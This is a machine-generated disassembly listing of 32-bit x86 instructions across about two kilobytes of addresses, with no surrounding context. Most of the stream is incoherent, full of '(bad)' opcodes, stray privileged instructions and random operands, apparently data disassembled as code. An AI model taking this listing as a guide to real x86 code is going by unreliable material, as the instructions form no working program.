  41e7af:	aam    0xc3
  41e7b1:	sbb    BYTE PTR [esi+0x6475f6b2],al
  41e7b7:	stos   BYTE PTR es:[edi],al
  41e7b8:	mov    dh,BYTE PTR [ebp+0x814de3e]
  41e7be:	jecxz  0x41e7e4
  41e7c0:	xor    ch,bl
  41e7c2:	sub    BYTE PTR ds:0xe70c2b08,0x47
  41e7c9:	add    esp,DWORD PTR [edx-0x40a78720]
  41e7cf:	xchg   edx,eax
  41e7d0:	xor    eax,0x7bc9605a
  41e7d5:	idiv   DWORD PTR [edx+esi*2-0x12ff4e8a]
  41e7dc:	jno    0x41e7f8
  41e7de:	pop    esi
  41e7df:	sub    BYTE PTR [eax+ecx*4],ah
  41e7e2:	push   0x36aa554
  41e7e7:	jns    0x41e784
  41e7e9:	scas   eax,DWORD PTR es:[edi]
  41e7ea:	mov    edi,0xa202632c
  41e7ef:	test   al,0xdc
  41e7f1:	fwait
  41e7f2:	cmp    eax,0x19b53dd7
  41e7f7:	jge    0x41e7ed
  41e7f9:	adc    ecx,DWORD PTR [eax]
  41e7fb:	int    0xe9
  41e7fd:	pop    esi
  41e7fe:	(bad)  
  41e7ff:	leave  
  41e800:	inc    DWORD PTR ds:0xbe86c752
  41e806:	mov    al,ds:0xe6002261
  41e80b:	(bad)  
  41e80c:	jo     0x41e888
  41e80e:	sub    DWORD PTR [ebp+0x6b],edi
  41e811:	repnz es push eax
  41e814:	mov    DWORD PTR [edi-0x710e3ab3],ebx
  41e81a:	dec    edi
  41e81b:	in     al,dx
  41e81c:	sahf   
  41e81d:	add    eax,0x3ecec7e
  41e822:	mov    edx,0x1fea19f4
  41e827:	ror    DWORD PTR [eax-0x41a900ee],cl
  41e82d:	bnd jnp 0x41e804
  41e830:	push   ebx
  41e831:	mov    eax,ds:0xddc3705d
  41e836:	iret   
  41e837:	int3   
  41e838:	mov    BYTE PTR [ebx+0x38],cl
  41e83b:	mov    esp,0x8dd04354
  41e840:	add    al,BYTE PTR [ecx]
  41e842:	les    esp,FWORD PTR [ecx+0x48199896]
  41e848:	dec    edx
  41e849:	jecxz  0x41e89e
  41e84b:	cwde   
  41e84c:	imul   ebp,DWORD PTR [edi+0xa48d51f],0xd3de4e6e
  41e856:	addr16 jne 0x41e84f
  41e859:	add    eax,0x555443b0
  41e85e:	pop    ebp
  41e85f:	sbb    bh,BYTE PTR [edi]
  41e861:	fbld   TBYTE PTR [ecx-0x33]
  41e864:	and    ch,dl
  41e866:	push   esi
  41e867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e868:	jbe    0x41e8d9
  41e86a:	fbstp  TBYTE PTR [edx+ebx*2+0x78d496e6]
  41e871:	les    esi,FWORD PTR [ebx-0x16c1e54f]
  41e877:	and    DWORD PTR [eax-0x300e6051],ecx
  41e87d:	dec    ecx
  41e87e:	leave  
  41e87f:	add    BYTE PTR [esi],ah
  41e881:	add    ch,BYTE PTR [esi+0x63]
  41e884:	inc    eax
  41e885:	xor    DWORD PTR [ecx-0x25],eax
  41e888:	sar    BYTE PTR [ebx-0x9ebee1],1
  41e88e:	mov    dl,0x35
  41e890:	sbb    ebx,0xfffffff2
  41e893:	jl     0x41e84b
  41e895:	mov    dh,cl
  41e897:	aad    0x41
  41e899:	mov    al,0xa4
  41e89b:	cli    
  41e89c:	jmp    0x41e902
  41e89e:	push   ds
  41e89f:	aad    0x26
  41e8a1:	aam    0xb9
  41e8a3:	mov    DWORD PTR [eax+0x6bd71b5a],edi
  41e8a9:	pop    ss
  41e8aa:	(bad)  
  41e8ab:	loope  0x41e888
  41e8ad:	push   edi
  41e8ae:	inc    esi
  41e8af:	outs   dx,BYTE PTR ds:[esi]
  41e8b0:	dec    BYTE PTR [ecx+0x0]
  41e8b3:	aam    0xd4
  41e8b5:	stc    
  41e8b6:	clc    
  41e8b7:	loope  0x41e85f
  41e8b9:	daa    
  41e8ba:	mov    dl,ch
  41e8bc:	inc    eax
  41e8bd:	in     al,0xb2
  41e8bf:	lods   al,BYTE PTR ds:[esi]
  41e8c0:	fst    QWORD PTR [edi+0x1f88fb75]
  41e8c6:	jl     0x41e85c
  41e8c8:	out    dx,al
  41e8c9:	cmp    al,0xdf
  41e8cb:	stc    
  41e8cc:	push   cs
  41e8cd:	add    al,0x0
  41e8cf:	ss popa 
  41e8d1:	sbb    eax,0xaa0c1d62
  41e8d6:	leave  
  41e8d7:	jnp    0x41e862
  41e8d9:	mov    esp,0x607ade76
  41e8de:	pop    ds
  41e8df:	mov    ebp,0x4da695c3
  41e8e4:	xchg   esi,eax
  41e8e5:	sar    al,cl
  41e8e7:	rol    DWORD PTR [esi-0x3af0ef24],cl
  41e8ed:	outs   dx,DWORD PTR ds:[esi]
  41e8ee:	pop    esi
  41e8ef:	out    0x8b,al
  41e8f1:	and    edi,DWORD PTR ds:[ecx]
  41e8f4:	mov    ecx,esp
  41e8f6:	or     dl,BYTE PTR [esi-0x4c]
  41e8f9:	ret    
  41e8fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8fb:	ret    0x2c3
  41e8fe:	jbe    0x41e91f
  41e900:	test   BYTE PTR [edi-0x45],ah
  41e903:	sub    edi,DWORD PTR ds:0x3d3d1e14
  41e909:	dec    ebx
  41e90a:	or     DWORD PTR ds:0xd72b9fd0,0x6d3347b2
  41e914:	das    
  41e915:	xchg   esp,eax
  41e916:	xor    eax,0xb3f58981
  41e91b:	dec    ecx
  41e91c:	dec    edi
  41e91d:	mov    ebp,0x339e06e
  41e922:	lock xchg ebp,eax
  41e924:	inc    eax
  41e925:	xchg   DWORD PTR [ecx-0x78],ebx
  41e928:	and    edi,edx
  41e92a:	outs   dx,BYTE PTR ds:[esi]
  41e92b:	in     eax,0xf6
  41e92d:	push   eax
  41e92e:	push   0xd1e0800
  41e933:	les    ebp,FWORD PTR [ebx+0x3]
  41e936:	lods   al,BYTE PTR ds:[esi]
  41e937:	add    edi,edx
  41e939:	cmp    al,0x27
  41e93b:	mov    edx,0x191fa002
  41e940:	cmp    ebp,DWORD PTR [edx]
  41e942:	mov    eax,ds:0xa07c0c2b
  41e947:	loopne 0x41e957
  41e949:	add    dh,dl
  41e94b:	fld    QWORD PTR [edx+0x27d34fe8]
  41e951:	push   ecx
  41e952:	mov    fs,WORD PTR [ebp+0x4b4205d7]
  41e958:	jbe    0x41e8eb
  41e95a:	dec    ecx
  41e95b:	(bad)  
  41e95c:	jne    0x41e960
  41e95e:	rcr    bh,cl
  41e960:	push   eax
  41e961:	jmp    0xeb60:0xd945ec74
  41e968:	std    
  41e969:	xchg   esi,ebx
  41e96b:	push   es
  41e96c:	neg    BYTE PTR [edi+0x46]
  41e96f:	mov    ebx,0x46b17e34
  41e974:	mov    BYTE PTR [esp+eiz*2-0x619acdc3],dl
  41e97b:	mov    al,0x4b
  41e97d:	fistp  WORD PTR [esi-0x33fa6f53]
  41e983:	and    ecx,DWORD PTR [edx]
  41e985:	int    0x33
  41e987:	lods   eax,DWORD PTR ds:[esi]
  41e988:	inc    eax
  41e989:	int3   
  41e98a:	pusha  
  41e98b:	push   ebp
  41e98c:	mov    edi,0xb86af0a2
  41e991:	sub    al,0x44
  41e993:	aam    0xb6
  41e995:	ds inc esi
  41e997:	hlt    
  41e998:	jae    0x41e951
  41e99a:	test   eax,0xc7f7f64d
  41e99f:	sahf   
  41e9a0:	mov    ah,0x88
  41e9a2:	loopne 0x41e94a
  41e9a4:	or     al,0x1b
  41e9a6:	in     eax,dx
  41e9a7:	retf   
  41e9a8:	int    0x2
  41e9aa:	and    al,0x5
  41e9ac:	int3   
  41e9ad:	xor    DWORD PTR [edx-0x65],ecx
  41e9b0:	retf   0x1f39
  41e9b3:	jg     0x41e946
  41e9b5:	aad    0xfc
  41e9b7:	mov    WORD PTR [edx+0x6],?
  41e9ba:	jnp    0x41e9d0
  41e9bc:	mov    bl,0x2
  41e9be:	test   BYTE PTR [eax],dl
  41e9c0:	test   al,0x64
  41e9c2:	test   al,0x57
  41e9c4:	xor    al,0x1c
  41e9c6:	pop    ds
  41e9c7:	imul   esp
  41e9c9:	mov    ds:0x91ae137b,al
  41e9ce:	inc    esp
  41e9cf:	rcr    DWORD PTR [esi-0x2422f5fe],0xfa
  41e9d6:	adc    DWORD PTR [esi],ecx
  41e9d8:	imul   eax,edx,0x91ebf31f
  41e9de:	aaa    
  41e9df:	sar    BYTE PTR [edi],0x4d
  41e9e2:	repnz repnz bound edx,QWORD PTR ds:0x532c9f50
  41e9ea:	out    dx,al
  41e9eb:	dec    edi
  41e9ec:	pop    ebx
  41e9ed:	add    eax,DWORD PTR [edi]
  41e9ef:	push   esi
  41e9f0:	sub    BYTE PTR [ecx+0x3f89560d],bh
  41e9f6:	nop
  41e9f7:	lods   al,BYTE PTR ds:[esi]
  41e9f8:	lods   al,BYTE PTR ds:[esi]
  41e9f9:	xchg   BYTE PTR [ebx+0x4646a75f],cl
  41e9ff:	push   ss
  41ea00:	or     al,0x80
  41ea02:	dec    ebx
  41ea03:	push   esp
  41ea04:	arpl   WORD PTR [esi+0x67],si
  41ea07:	pop    ss
  41ea08:	or     al,0xdb
  41ea0a:	push   eax
  41ea0b:	inc    esp
  41ea0c:	(bad)  
  41ea0d:	fnsave [esi-0x196832d0]
  41ea13:	shl    esi,cl
  41ea15:	push   ds
  41ea16:	fist   WORD PTR ds:0xd5d52ce8
  41ea1c:	arpl   WORD PTR [eax+0x79],ax
  41ea1f:	pop    ebp
  41ea20:	mov    bh,0xc7
  41ea22:	xor    ecx,esp
  41ea24:	xchg   esp,eax
  41ea25:	sbb    edx,DWORD PTR [eax]
  41ea27:	pop    ds
  41ea28:	add    DWORD PTR [edx-0x3c077fb9],eax
  41ea2e:	inc    edx
  41ea2f:	aam    0x27
  41ea31:	sti    
  41ea32:	(bad)  
  41ea33:	mov    cl,ah
  41ea35:	iret   
  41ea36:	es xor eax,0x5f6f188
  41ea3c:	cmp    al,BYTE PTR [ebx+0x5b2af78]
  41ea42:	pop    eax
  41ea43:	(bad)  
  41ea44:	(bad)  
  41ea45:	popa   
  41ea46:	lock not BYTE PTR [ebp-0x6052e0ac]
  41ea4d:	inc    DWORD PTR [ecx]
  41ea4f:	imul   edx,ecx,0xffffffb0
  41ea52:	or     eax,DWORD PTR [esp+esi*1-0x15]
  41ea56:	pop    ds
  41ea57:	pop    edi
  41ea58:	mov    al,ds:0x44467c51
  41ea5d:	bnd jne 0x41ea97
  41ea60:	push   es
  41ea61:	adc    ebx,esi
  41ea63:	rol    DWORD PTR [eax],cl
  41ea65:	add    bh,al
  41ea67:	cmc    
  41ea68:	repnz cld 
  41ea6a:	add    edx,esp
  41ea6c:	rcr    BYTE PTR [ecx+eiz*1],0x5
  41ea70:	sub    BYTE PTR [eax+ecx*4],ch
  41ea73:	leave  
  41ea74:	repnz (bad) 
  41ea76:	dec    ebx
  41ea77:	mov    ecx,0x144988e2
  41ea7c:	(bad)  
  41ea7d:	je     0x41eaf0
  41ea7f:	not    DWORD PTR [edi+0x5bdbb1e2]
  41ea85:	add    ch,ah
  41ea87:	cmp    esi,DWORD PTR [ecx-0x160804c4]
  41ea8d:	sti    
  41ea8e:	and    BYTE PTR [eax-0x6ff9c78],0x18
  41ea95:	ss mov ah,0x12
  41ea98:	arpl   WORD PTR [edx],ax
  41ea9a:	push   esi
  41ea9b:	mov    esi,0xc9ead3a7
  41eaa0:	push   edi
  41eaa1:	or     edx,DWORD PTR [ebx+eiz*2]
  41eaa4:	mov    BYTE PTR [ebx],dl
  41eaa6:	ja     0x41ea76
  41eaa8:	lock sbb bl,BYTE PTR [eax]
  41eaab:	sbb    BYTE PTR [esi],0x2
  41eaae:	add    dl,BYTE PTR [esi+0x69dd824]
  41eab4:	fbld   TBYTE PTR [edx+eiz*2-0x3134be87]
  41eabb:	jmp    0x1d5c:0xed0f0c83
  41eac2:	sahf   
  41eac3:	push   esi
  41eac4:	jbe    0x41eb3e
  41eac6:	imul   eax,ecx,0x46232f8
  41eacc:	mov    BYTE PTR [ebx+0xd635510],cl
  41ead2:	(bad)
  41ead6:	inc    esi
  41ead7:	(bad)  
  41ead8:	jo     0x41ea7c
  41eada:	and    edi,ebp
  41eadc:	push   ebp
  41eadd:	add    eax,0x8227131f
  41eae2:	retf   0x1e0c
  41eae5:	jp     0x41eb15
  41eae7:	test   cl,bl
  41eae9:	dec    eax
  41eaea:	inc    edi
  41eaeb:	popa   
  41eaec:	dec    ebx
  41eaed:	popa   
  41eaee:	btr    DWORD PTR [ecx-0x71685773],ecx
  41eaf5:	retf   0x701
  41eaf8:	adc    al,0x3
  41eafa:	cmp    BYTE PTR [ebx-0x724c8de0],0x16
  41eb01:	inc    ebx
  41eb02:	jl     0x41eb33
  41eb04:	fdivr  DWORD PTR [esp+eax*2]
  41eb07:	adc    al,0x3e
  41eb09:	mov    dl,0xea
  41eb0b:	jmp    0x6967f0ee
  41eb10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb11:	and    DWORD PTR [esi+0x65061f22],ecx
  41eb17:	in     eax,0x9d
  41eb19:	loop   0x41eb9a
  41eb1b:	cmp    dh,al
  41eb1d:	loop   0x41eae5
  41eb1f:	pop    ss
  41eb20:	sbb    BYTE PTR [edx],al
  41eb22:	(bad)  
  41eb24:	inc    edx
  41eb25:	ja     0x41eb3f
  41eb27:	jns    0x41eb06
  41eb29:	call   0x251bae4d
  41eb2e:	daa    
  41eb2f:	mov    dh,0x92
  41eb31:	sub    eax,0xc8ce98f
  41eb36:	xor    edx,esp
  41eb38:	jnp    0x41eac4
  41eb3a:	adc    BYTE PTR [esp+ebx*4-0x706c07b4],ch
  41eb41:	ins    DWORD PTR es:[edi],dx
  41eb42:	mov    BYTE PTR [esi+0x26],dh
  41eb45:	inc    ebp
  41eb46:	jecxz  0x41ebad
  41eb48:	add    eax,0x5af72263
  41eb4d:	(bad)  
  41eb4e:	cld    
  41eb4f:	xlat   BYTE PTR ds:[ebx]
  41eb50:	sub    dl,BYTE PTR [edi-0x15]
  41eb53:	push   edi
  41eb54:	loopne 0x41eae4
  41eb56:	aaa    
  41eb57:	(bad)  
  41eb59:	push   edx
  41eb5a:	push   ds
  41eb5b:	xor    edi,DWORD PTR [edx-0x6d9898e4]
  41eb61:	sbb    edi,ecx
  41eb63:	aam    0xd1
  41eb65:	call   0x224a:0xb91f57f4
  41eb6c:	(bad)  
  41eb6d:	cmp    eax,0xd631d4ee
  41eb72:	dec    ebx
  41eb73:	mov    esi,0xa2683e2a
  41eb78:	mov    gs,eax
  41eb7a:	or     al,0xa9
  41eb7c:	add    bp,WORD PTR [edi-0xb12e809]
  41eb83:	mov    ah,0x30
  41eb85:	sub    eax,0x5be3e718
  41eb8a:	pop    ds
  41eb8b:	inc    ecx
  41eb8c:	sub    eax,0x88988d9b
  41eb91:	mov    ebp,0xf3ebd03a
  41eb96:	shl    esi,cl
  41eb98:	jmp    0x9f0cebe5
  41eb9d:	test   DWORD PTR [esp+ecx*4],edi
  41eba0:	sub    bl,BYTE PTR [esi]
  41eba2:	pop    edi
  41eba3:	test   BYTE PTR [edi+esi*2-0x2879d037],ch
  41ebaa:	nop
  41ebab:	imul   ecx,DWORD PTR [ecx-0x3f],0x2676ffb9
  41ebb2:	sahf   
  41ebb3:	sbb    eax,DWORD PTR [ecx-0x13881f31]
  41ebb9:	into   
  41ebba:	mov    eax,cs
  41ebbc:	test   al,0x36
  41ebbe:	pop    ds
  41ebbf:	mov    ebp,0xd693ccba
  41ebc4:	xor    BYTE PTR [ebx+0x57e8d70e],ch
  41ebca:	pop    ebx
  41ebcb:	out    dx,eax
  41ebcc:	add    DWORD PTR [edx+0x27882070],esp
  41ebd2:	mov    esp,0x58d56a77
  41ebd7:	cmp    BYTE PTR [edi-0x62f1d5ec],ah
  41ebdd:	outs   dx,BYTE PTR ds:[esi]
  41ebde:	mov    ds:0x8f27e4d4,eax
  41ebe3:	fstp   DWORD PTR [ebx-0x231fb781]
  41ebe9:	in     eax,0xd6
  41ebeb:	mov    eax,0xf21c790c
  41ebf0:	dec    ecx
  41ebf1:	dec    edi
  41ebf2:	push   cs
  41ebf3:	pop    esi
  41ebf4:	adc    eax,DWORD PTR [ebx+0x1e]
  41ebf7:	xchg   ebp,eax
  41ebf8:	push   ds
  41ebf9:	pop    edx
  41ebfa:	loope  0x41ebcf
  41ebfc:	cmp    BYTE PTR [eax],0x8e
  41ebff:	aad    0xeb
  41ec01:	push   eax
  41ec02:	mov    ds:0x184a6062,al
  41ec07:	inc    esp
  41ec08:	mov    ebx,edx
  41ec0a:	or     DWORD PTR [edx-0x2d8bb169],ecx
  41ec10:	mov    ebx,0x68b87005
  41ec15:	stos   BYTE PTR es:[edi],al
  41ec16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec17:	pushf  
  41ec18:	pop    esi
  41ec19:	in     eax,0x5c
  41ec1b:	push   ecx
  41ec1c:	sbb    eax,0xdce89e22
  41ec21:	mov    dl,0x1c
  41ec23:	jns    0x41ec4b
  41ec25:	add    cl,dl
  41ec27:	mov    DWORD PTR [ebp-0x6],esp
  41ec2a:	dec    edi
  41ec2b:	cmp    eax,0x370384d
  41ec30:	(bad)  
  41ec32:	loop   0x41ec09
  41ec34:	jo     0x41ebf8
  41ec36:	in     al,dx
  41ec37:	inc    ebx
  41ec38:	and    ebx,DWORD PTR [ecx+0x10]
  41ec3b:	pop    edi
  41ec3c:	xor    DWORD PTR [esi-0x3a32dee1],edi
  41ec42:	add    DWORD PTR [ecx],edi
  41ec44:	inc    esi
  41ec45:	add    esp,DWORD PTR [eax+0x5e]
  41ec48:	mov    eax,0xedb034f8
  41ec4d:	loope  0x41ec6e
  41ec4f:	jg     0xa9278537
  41ec55:	enter  0xd438,0xea
  41ec59:	or     esp,ebx
  41ec5b:	adc    eax,0xa99a8f98
  41ec60:	mov    BYTE PTR [ebp+0x50],bh
  41ec63:	cmp    eax,0xc6c3e7c4
  41ec68:	out    dx,eax
  41ec69:	sub    DWORD PTR [ebp+edi*1-0x37608297],edi
  41ec70:	xchg   DWORD PTR [ebp+0x5d890292],esp
  41ec76:	leave  
  41ec77:	and    dh,ah
  41ec79:	retf   
  41ec7a:	fsub   QWORD PTR [edx+0x70aa0374]
  41ec80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec81:	xor    BYTE PTR [eax],dl
  41ec83:	gs stos BYTE PTR es:[edi],al
  41ec85:	rcr    BYTE PTR [edi],cl
  41ec87:	jae    0x41ed01
  41ec89:	das    
  41ec8a:	or     al,0x76
  41ec8c:	call   0x7d18605a
  41ec91:	pop    esp
  41ec92:	outs   dx,BYTE PTR ds:[esi]
  41ec93:	in     eax,dx
  41ec94:	icebp  
  41ec95:	jecxz  0x41ecb0
  41ec97:	je     0x41eca4
  41ec99:	sbb    edi,DWORD PTR [edi-0x7e]
  41ec9c:	mov    BYTE PTR [ecx],al
  41ec9e:	(bad)  
  41ec9f:	paddw  mm3,QWORD PTR [eax]
  41eca2:	pop    ebx
  41eca3:	out    dx,eax
  41eca4:	aad    0x2
  41eca6:	jbe    0x41ec7a
  41eca8:	cmp    eax,0x51411953
  41ecad:	call   0x57b887d1
  41ecb2:	adc    DWORD PTR [ecx+0x30],edi
  41ecb5:	mov    ebx,0x5f11025
  41ecba:	or     BYTE PTR [edi-0x1e],dh
  41ecbd:	shl    DWORD PTR [edi],cl
  41ecbf:	cmp    ch,BYTE PTR [ecx]
  41ecc1:	push   ss
  41ecc2:	iret   
  41ecc3:	repz mov WORD PTR [edx],es
  41ecc6:	adc    BYTE PTR ds:0xa074f7d,cl
  41eccc:	adc    DWORD PTR [ebx],eax
  41ecce:	and    bh,BYTE PTR [edi]
  41ecd0:	pop    edi
  41ecd1:	sub    ebp,DWORD PTR [ebp+eiz*4-0x1]
  41ecd5:	inc    eax
  41ecd6:	pop    ds
  41ecd7:	aad    0x3b
  41ecd9:	push   esi
  41ecda:	push   0xca3ff8dd
  41ecdf:	int    0xce
  41ece1:	add    eax,0xdb55b48e
  41ece6:	hlt    
  41ece7:	sbb    ah,al
  41ece9:	das    
  41ecea:	xchg   edi,eax
  41eceb:	test   DWORD PTR [edi-0x2967f4e8],esi
  41ecf1:	ss loopne 0x41ed5c
  41ecf4:	daa    
  41ecf5:	xchg   edx,eax
  41ecf6:	idiv   DWORD PTR [eax-0x2a031090]
  41ecfc:	das    
  41ecfd:	inc    ebp
  41ecfe:	adc    BYTE PTR [eax+0x37],dh
  41ed01:	test   DWORD PTR [edx+0x31],ebp
  41ed04:	mov    BYTE PTR ds:0x781787d8,ah
  41ed0a:	jmp    0x9e04:0x8c29d862
  41ed11:	loop   0x41ed78
  41ed13:	mov    WORD PTR [ecx],fs
  41ed15:	loope  0x41ec9c
  41ed17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed18:	leave  
  41ed19:	or     BYTE PTR [eax+0x70],dh
  41ed1c:	mov    ecx,?
  41ed1e:	jnp    0x41ecef
  41ed20:	xchg   BYTE PTR [edx-0x5645e8cf],cl
  41ed26:	(bad)  
  41ed27:	aad    0xe5
  41ed29:	push   ecx
  41ed2a:	sahf   
  41ed2b:	lea    esi,[edi+0x4d]
  41ed2e:	add    ebx,DWORD PTR [eax-0xcdbf278]
  41ed34:	lods   al,BYTE PTR ds:[esi]
  41ed35:	js     0x41ed85
  41ed37:	imul   ecx,DWORD PTR [edi+eax*2],0x30a1dc2
  41ed3e:	jg     0x41ed9c
  41ed40:	scas   eax,DWORD PTR es:[edi]
  41ed41:	loop   0x41edb1
  41ed43:	hlt    
  41ed44:	test   bl,dl
  41ed46:	adc    al,0x14
  41ed48:	mov    bh,0xca
  41ed4a:	jnp    0x41ed8c
  41ed4c:	mov    cs,WORD PTR [edx+0x4325ca1f]
  41ed52:	dec    edx
  41ed53:	into   
  41ed54:	ret    0x1f3a
  41ed57:	mov    edi,0x44808cc5
  41ed5c:	loop   0x41ed2f
  41ed5e:	push   ds
  41ed5f:	aam    0x92
  41ed61:	pop    edx
  41ed62:	in     eax,0xa5
  41ed64:	dec    BYTE PTR [ecx-0x50768d5d]
  41ed6a:	sbb    al,0x33
  41ed6c:	stos   DWORD PTR es:[edi],eax
  41ed6d:	xor    eax,0x58d9cfa
  41ed72:	sbb    dh,BYTE PTR [edx-0x6d]
  41ed75:	outs   dx,BYTE PTR ds:[esi]
  41ed76:	or     cl,BYTE PTR [eax]
  41ed78:	push   eax
  41ed79:	inc    esp
  41ed7a:	gs jno 0x41ed49
  41ed7d:	cld    
  41ed7e:	pop    edx
  41ed7f:	imul   DWORD PTR [ebx]
  41ed81:	inc    edx
  41ed82:	fisttp DWORD PTR [ebp+0x6d120002]
  41ed88:	out    0x50,eax
  41ed8a:	pop    edi
  41ed8b:	sti    
  41ed8c:	inc    edx
  41ed8d:	shl    BYTE PTR [esp+ebp*8-0xd1447ef],cl
  41ed94:	mov    ebx,ecx
  41ed96:	es ret 
  41ed98:	dec    edi
  41ed99:	test   al,0x9f
  41ed9b:	sub    ecx,esi
  41ed9d:	add    eax,0x8e5fa466
  41eda2:	fucomp st(7)
  41eda4:	cs addr16 pop ds
  41eda7:	sbb    eax,0x27ae7ebd
  41edac:	in     al,dx
  41edad:	push   esi
  41edae:	mov    eax,ds:0x244c7b9d
  41edb3:	push   edi
  41edb4:	mov    al,0x13
  41edb6:	ins    BYTE PTR es:[edi],dx
  41edb7:	push   cs
  41edb8:	aaa    
  41edb9:	and    bl,BYTE PTR [edx+0x50022f4d]
  41edbf:	and    dl,BYTE PTR [eax+0x52]
  41edc2:	jg     0x41ee16
  41edc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edc5:	add    bh,BYTE PTR [eax-0xd393b98]
  41edcb:	dec    ecx
  41edcc:	mov    es,WORD PTR [eax+0x6ddc011f]
  41edd2:	push   ss
  41edd3:	in     al,0x1e
  41edd5:	xchg   edx,eax
  41edd6:	fsubr  DWORD PTR [ebx-0x4dfa2e17]
  41eddc:	cmp    BYTE PTR [ebx+0x79],al
  41eddf:	xchg   edi,eax
  41ede0:	test   DWORD PTR [edx-0x16f2e6a0],0x6b8670be
  41edea:	or     edx,esp
  41edec:	cli    
  41eded:	xchg   ebp,eax
  41edee:	add    DWORD PTR [edx+edi*2+0x59],0xffffffe9
  41edf3:	sbb    ebx,DWORD PTR [ebx-0xa60b181]
  41edf9:	pop    ss
  41edfa:	push   cs
  41edfb:	inc    edx
  41edfc:	mov    DWORD PTR [edx+0x7],ebx
  41edff:	jne    0x41ede2
  41ee01:	or     DWORD PTR [esi-0xd],edi
  41ee04:	mov    dl,0x5
  41ee06:	mov    esp,0x5eba9d66
  41ee0b:	or     al,0x70
  41ee0d:	push   es
  41ee0e:	pusha  
  41ee0f:	dec    ecx
  41ee10:	and    dl,BYTE PTR [eax+0x428e3fe1]
  41ee16:	and    dl,ah
  41ee18:	sub    dl,bl
  41ee1a:	xchg   ebp,eax
  41ee1b:	sbb    al,0x6a
  41ee1d:	sbb    BYTE PTR [ecx-0x4f],0x6a
  41ee21:	in     al,0x1f
  41ee23:	push   ecx
  41ee24:	ds cld 
  41ee26:	retf   0x3a31
  41ee29:	scas   al,BYTE PTR es:[edi]
  41ee2a:	dec    esi
  41ee2b:	aad    0xbc
  41ee2d:	out    0xe6,eax
  41ee2f:	test   BYTE PTR [ecx-0x1e],0x7d
  41ee33:	sti    
  41ee34:	mov    DWORD PTR [edi+0xa],edx
  41ee37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee38:	loopne 0x41edc7
  41ee3a:	add    esi,DWORD PTR [ebx]
  41ee3c:	aam    0x1
  41ee3e:	xchg   edx,eax
  41ee3f:	mov    WORD PTR [ecx+0x9b89e83],?
  41ee45:	pop    es
  41ee46:	mov    ds:0x6cbb8943,eax
  41ee4b:	(bad)  
  41ee4c:	cmp    ebp,DWORD PTR [edi]
  41ee4e:	imul   BYTE PTR [ecx]
  41ee50:	xchg   ebx,eax
  41ee51:	daa    
  41ee52:	inc    edx
  41ee53:	xor    ebx,ebp
  41ee55:	sub    al,0xe4
  41ee57:	(bad)  
  41ee58:	sysret 
  41ee5a:	and    bh,dh
  41ee5c:	sbb    al,BYTE PTR [ecx-0x1e7731e4]
  41ee62:	cmc    
  41ee63:	sub    DWORD PTR [eax+0x63],edx
  41ee66:	das    
  41ee67:	mov    esp,0x484602dc
  41ee6c:	(bad)  
  41ee6d:	call   0x3f58:0x25ac1c6b
  41ee74:	xor    al,BYTE PTR [ebp+0x1e]
  41ee77:	out    0x6d,eax
  41ee79:	into   
  41ee7a:	ficom  WORD PTR [edx+0x39]
  41ee7d:	add    dh,BYTE PTR [edx+0x69]
  41ee80:	or     esp,DWORD PTR [edx]
  41ee82:	pop    es
  41ee83:	cmp    bh,ch
  41ee85:	bound  ebx,QWORD PTR [edi]
  41ee87:	ja     0x41ee2d
  41ee89:	dec    ebx
  41ee8a:	push   0xa4cab322
  41ee8f:	pop    eax
  41ee90:	dec    ebp
  41ee91:	or     ah,BYTE PTR [eax-0x71]
  41ee94:	jge    0x41ef0a
  41ee96:	jecxz  0x41ee24
  41ee98:	imul   esp,DWORD PTR [ecx+ebx*1-0x1f3d1978],0x20
  41eea0:	add    DWORD PTR ds:0x64564dba,0xc8117d06
  41eeaa:	pop    ds
  41eeab:	pop    es
  41eeac:	xchg   edx,eax
  41eead:	fcmove st,st(5)
  41eeaf:	add    edx,DWORD PTR [edx+0x7ed4fa45]
  41eeb5:	xor    dh,0xfc
  41eeb8:	(bad)  
  41eeb9:	jmp    0xe1f2f023
  41eebe:	mov    esp,0x31990972
  41eec3:	mov    al,0x12
  41eec5:	rol    DWORD PTR [edx-0x2c],1
  41eec8:	inc    esp
  41eec9:	sti    
  41eeca:	push   esp
  41eecb:	add    ah,al
  41eecd:	or     eax,0x738b0ba3
  41eed2:	test   al,0xc2
  41eed4:	sbb    al,0xa2
  41eed6:	push   cs
  41eed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eed8:	call   0x46e8b864
  41eedd:	jne    0x41eeab
  41eedf:	sbb    ecx,DWORD PTR [eax-0x30af1738]
  41eee5:	pusha  
  41eee6:	ins    BYTE PTR es:[edi],dx
  41eee7:	cmp    esp,DWORD PTR [ecx+0x44]
  41eeea:	clc    
  41eeeb:	push   cs
  41eeec:	push   0x87df6e01
  41eef1:	add    dh,dl
  41eef3:	or     BYTE PTR [esi+0x1b665c1c],cl
  41eef9:	pop    ss
  41eefa:	push   ds
  41eefb:	and    DWORD PTR [edi],esp
  41eefd:	adc    ch,BYTE PTR [ecx-0x1a025986]
  41ef03:	xlat   BYTE PTR ds:[ebx]
  41ef04:	adc    al,0x18
  41ef06:	ror    BYTE PTR [edx-0x46],cl
  41ef09:	sbb    dl,BYTE PTR [edi+0x6d84f5]
  41ef0f:	jmp    0x41ee99
  41ef11:	mov    al,ds:0x3d8f50a0
  41ef16:	scas   eax,DWORD PTR es:[edi]
  41ef17:	xor    eax,0xa71f5e79
  41ef1c:	cld    
  41ef1d:	cvtpi2ps xmm6,QWORD PTR [ecx-0x4512d290]
  41ef24:	jmp    0x490cbcf0
  41ef29:	outs   dx,DWORD PTR ds:[esi]
  41ef2a:	mov    ecx,0x5e84ea09
  41ef2f:	fst    DWORD PTR [edx-0x76]
  41ef32:	lahf   
  41ef33:	sub    al,0xb4
  41ef35:	rcl    BYTE PTR [edx],1
  41ef37:	(bad)  
  41ef38:	(bad)  
  41ef39:	loope  0x41ef0d
  41ef3b:	aad    0xca
  41ef3d:	pop    esi
  41ef3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef3f:	xchg   BYTE PTR [ecx],dh
  41ef41:	pusha  
